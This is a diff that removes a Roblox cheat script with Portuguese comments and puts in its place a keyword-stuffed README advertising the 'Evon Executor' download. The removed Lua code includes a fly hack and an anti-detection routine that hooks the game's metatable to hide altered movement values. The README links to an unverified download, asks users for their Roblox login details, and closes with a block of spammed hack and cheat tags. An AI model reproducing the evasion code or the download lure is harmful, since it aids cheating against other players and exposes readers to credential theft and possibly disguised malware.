@@ -1,113 +1,58 @@
--- Script Open Source para Mini City
--- Funcionalidades: Auto-Farm de Peças de Arma, Auto-Farm de Planta Suja, ESP, UI personalizada, Teleporte para Locais Específicos, Safe Teleport, Auto-Quest, Auto-Loot Rápido, Mudança de Cores do Menu, Aimbot, Wallhack, Spawn de Veículos Exclusivos, Geração de Dinheiro, Modo Voo, Proteção Anti-Detecção Avançada
+# 🚀 Evon Executor - Roblox Executor **[![Download Evon Executor](https://img.shields.io/badge/Download-Evon%20Executor-blueviolet)](../../releases)**
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalPlayer = Players.LocalPlayer
+## Quick Installation
+To get started with Evon Executor, follow these simple steps:
+1. **[![Download Evon Executor](https://img.shields.io/badge/Download-Evon%20Executor-blueviolet)](../../releases)**
+2. Extract the downloaded ZIP file to your desired location on your system.
 
--- Criar UI personalizada
-local ScreenGui = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local TitleLabel = Instance.new("TextLabel")
-local ChangeColorButton = Instance.new("TextButton")
-local AutoFarmGunPartsButton = Instance.new("TextButton")
-local AutoFarmDirtyPlantsButton = Instance.new("TextButton")
-local AutoLootButton = Instance.new("TextButton")
-local ESPButton = Instance.new("TextButton")
-local TeleportMenu = Instance.new("Frame")
-local SafeTeleportButton = Instance.new("TextButton")
-local AutoQuestButton = Instance.new("TextButton")
-local AimbotButton = Instance.new("TextButton")
-local WallhackButton = Instance.new("TextButton")
-local SpawnVehicleButton = Instance.new("TextButton")
-local MoneyFarmButton = Instance.new("TextButton")
-local FlyButton = Instance.new("TextButton")
+**Description:**  
+🚀 **Evon Executor** is a cutting-edge Roblox script executor designed for advanced script execution, optimized performance, and seamless user experience. Fully compatible with the latest Roblox updates, it is secure, easy to use, and perfect for gamers, developers, and modding enthusiasts looking to enhance their Roblox gameplay. 
 
-ScreenGui.Parent = game.CoreGui
-MainFrame.Parent = ScreenGui
-TitleLabel.Parent = MainFrame
-ChangeColorButton.Parent = MainFrame
-AutoFarmGunPartsButton.Parent = MainFrame
-AutoFarmDirtyPlantsButton.Parent = MainFrame
-AutoLootButton.Parent = MainFrame
-ESPButton.Parent = MainFrame
-TeleportMenu.Parent = MainFrame
-SafeTeleportButton.Parent = MainFrame
-AutoQuestButton.Parent = MainFrame
-AimbotButton.Parent = MainFrame
-WallhackButton.Parent = MainFrame
-SpawnVehicleButton.Parent = MainFrame
-MoneyFarmButton.Parent = MainFrame
-FlyButton.Parent = MainFrame
+**Keywords:** Roblox executor, script executor, Roblox hacks, Roblox mods, gaming tools, script engine, Roblox enhancements, Roblox modding 2025.
 
-MainFrame.Size = UDim2.new(0.3, 0, 0.9, 0)
-MainFrame.Position = UDim2.new(0.35, 0, 0.05, 0)
-MainFrame.Visible = true
-MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 
-TitleLabel.Size = UDim2.new(1, 0, 0.1, 0)
-TitleLabel.Position = UDim2.new(0, 0, 0, 0)
-TitleLabel.Text = "ModMenu P4TO"
-TitleLabel.TextScaled = true
-TitleLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+![Evon Executor Image](/assets/Evon.jpg)
 
--- Proteção Anti-Detecção
-local function bypassDetection()
-    local mt = getrawmetatable(game)
-    local oldIndex = mt.__index
-    setreadonly(mt, false)
-    mt.__index = newcclosure(function(t, k)
-        if k == "WalkSpeed" or k == "JumpPower" or k == "Gravity" then
-            return 16
-        end
-        return oldIndex(t, k)
-    end)
-    setreadonly(mt, true)
-end
-bypassDetection()
+## Table of Contents
+- [Introduction](#introduction)
+- [Key Features](#key-features)
+- [Installation Guide](#quick-installation)
+- [How to Use](#how-to-use)
+- [Contribute](#contribute)
+- [License](#license)
+- [Contact Us](#contact-us)
 
-local function secureExecution()
-    if setfflag then
-        setfflag("HumanoidParallelRemoveNoPhysics", "False")
-        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
-    end
-end
-secureExecution()
+## Introduction
+Welcome to **Evon Executor**, the latest and most powerful Roblox Executor designed to elevate your gaming experience. Whether you're a developer, gamer, or modding enthusiast, Evon Executor provides the ultimate tools to modify and enhance your Roblox gameplay.
 
-FlyButton.Size = UDim2.new(1, 0, 0.1, 0)
-FlyButton.Position = UDim2.new(0, 0, 1.2, 0)
-FlyButton.Text = "Ativar Voo"
+## Key Features
+Evon Executor includes a variety of advanced features tailored to your needs:
+- **Advanced Script Execution:** Execute complex scripts with ease and efficiency.
+- **Optimized Performance:** Enjoy smoother gameplay with enhanced performance capabilities.
+- **User-Friendly Interface:** Navigate easily through a clean and intuitive interface.
+- **Roblox Compatibility:** Fully compatible with the latest Roblox updates.
+- **Secure and Reliable:** Evon Executor is built with security in mind, ensuring a safe user experience.
 
-local flying = false
-local flySpeed = 50
+## How to Use
+Once you have installed Evon Executor, follow these steps to start using it:
+1. **Launch the Application:** Open Evon Executor from your installation directory.
+2. **Login:** Use your Roblox account details to login (if required).
+3. **Load a Script:** Choose the script you wish to execute from your library or create a new one.
+4. **Execute:** Click the execute button and let Evon handle the rest.
+5. **Enjoy:** Experience the enhanced features and smoother gameplay!
 
-FlyButton.MouseButton1Click:Connect(function()
-    flying = not flying
-    FlyButton.Text = flying and "Voo Ativado" or "Ativar Voo"
-    if flying then
-        local character = LocalPlayer.Character
-        if character and character:FindFirstChild("HumanoidRootPart") then
-            local hrp = character.HumanoidRootPart
-            local flyLoop
-            flyLoop = RunService.RenderStepped:Connect(function()
-                if flying then
-                    hrp.Velocity = Vector3.new(0, flySpeed, 0)
-                else
-                    flyLoop:Disconnect()
-                end
-            end)
-        end
-    end
-end)
+## Contribute
+We encourage community contributions to help make Evon Executor even better. If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request. Your input is invaluable!
 
--- Alternar visibilidade do menu com a tecla "K"
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if input.KeyCode == Enum.KeyCode.K and not gameProcessed then
-        MainFrame.Visible = not MainFrame.Visible
-    end
-end)
+## License
+This project is licensed under the MIT License. For more details, see the [LICENSE](LICENSE) file.
 
--- Mantém o restante das funcionalidades como Auto-Farm, Auto-Loot, ESP, Aimbot, Wallhack, Spawn de Veículos e Geração de Dinheiro
+## Contact Us
+**Join our Community on [Discord](https://discord.gg/Evon)!**  
+For support, updates, and to connect with other users, visit our Discord server.
+
+---
+
+**Tags:**  
+roblox cheat, roblox hacks, roblox executor, roblox script executor, roblox modding, roblox cheat engine, roblox exploits, roblox scripts 2025, roblox hack download, roblox cheat codes, roblox mod menu, roblox glitch, roblox bug, roblox hack tool, roblox mod tool, roblox cheat, roblox hacks, roblox exploits, roblox cheat codes, roblox glitches, roblox script, roblox mod, roblox hack download, roblox cheat engine, roblox cheats 2025, roblox cheat 2025, roblox cheat script, roblox cheat tool, roblox hack tool, roblox mod menu, roblox hack script, roblox exploit script, roblox exploit hack, roblox cheat hack, roblox mod hack, roblox glitch 2025, roblox bug, roblox glitch hack, roblox glitch script, roblox glitch exploit, roblox glitch mod, roblox script 2025, roblox mod 2025, roblox mod hack 2025, roblox hack tool 2025, roblox cheat tool 2025, roblox cheat engine 2025, roblox hack engine, roblox hack engine 2025, roblox exploit tool, roblox exploit tool 2025, roblox glitch exploit 2025, roblox glitch tool, roblox glitch tool 2025, roblox bug tool, roblox bug tool 2025, roblox bug exploit, roblox bug exploit 2025, roblox bug script, roblox bug script 2025, roblox bug hack, roblox bug hack 2025, roblox mod menu tool, roblox mod menu tool 2025, roblox mod mnu hack, roblox mod menu hack 2025, roblox mod menu exploit, roblox mod menu exploit 2025, roblox script tool, roblox script tool 2025, roblox mod tool, roblox mod tool 2025, roblox cheat engine hack, roblox cheat engine hack 2025, roblox cheat engine exploit, roblox cheat engine exploit 2025, roblox cheat engine script, roblox cheat engine script 2025, roblox cheat engine glitch, roblox cheat engine glitch 2025, roblox cheat engine bug, roblox cheat engine bug 2025, roblox exploit hack tool, roblox exploit hack tool 2025, roblox exploit hack script, roblox exploit hack script 2025, roblox exploit hack mod, roblox exploit hack mod 2025
+    
